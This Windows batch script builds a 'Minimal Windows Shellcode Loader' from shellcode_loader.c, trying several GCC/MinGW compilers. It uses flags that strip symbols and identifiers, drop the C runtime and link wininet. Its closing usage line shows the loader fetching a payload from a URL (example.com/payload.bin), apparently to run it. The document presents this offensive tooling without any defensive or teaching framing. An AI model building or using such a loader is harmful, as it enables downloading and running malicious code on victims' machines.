@echo off
REM Windows batch script for building the shellcode loader
REM Requires MinGW-w64 or Visual Studio with Windows SDK

echo Building Minimal Windows Shellcode Loader...
echo.

REM Check for MinGW-w64
where /q x86_64-w64-mingw32-gcc
if %ERRORLEVEL% equ 0 (
    echo Using MinGW-w64 64-bit compiler...
    x86_64-w64-mingw32-gcc -Os -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -fdata-sections -ffunction-sections -nostdlib -nostartfiles -s -Wl,--gc-sections -Wl,--strip-all -Wl,--no-seh -o shellcode_loader.exe shellcode_loader.c -lkernel32 -lwininet
    goto :check_result
)

REM Check for MinGW 32-bit
where /q i686-w64-mingw32-gcc
if %ERRORLEVEL% equ 0 (
    echo Using MinGW-w64 32-bit compiler...
    i686-w64-mingw32-gcc -Os -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -fdata-sections -ffunction-sections -nostdlib -nostartfiles -s -Wl,--gc-sections -Wl,--strip-all -Wl,--no-seh -o shellcode_loader.exe shellcode_loader.c -lkernel32 -lwininet
    goto :check_result
)

REM Try with regular gcc
where /q gcc
if %ERRORLEVEL% equ 0 (
    echo Using system GCC...
    gcc -Os -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident -fdata-sections -ffunction-sections -nostdlib -nostartfiles -s -Wl,--gc-sections -Wl,--strip-all -Wl,--no-seh -o shellcode_loader.exe shellcode_loader.c -lkernel32 -lwininet
    goto :check_result
)

echo Error: No suitable compiler found!
echo Please install MinGW-w64 or ensure GCC is in your PATH.
pause
exit /b 1

:check_result
if exist shellcode_loader.exe (
    echo.
    echo Build successful!
    dir shellcode_loader.exe
    echo.
    echo Usage: shellcode_loader.exe ^<URL^>
    echo Example: shellcode_loader.exe http://example.com/payload.bin
) else (
    echo.
    echo Build failed!
    pause
    exit /b 1
)

pause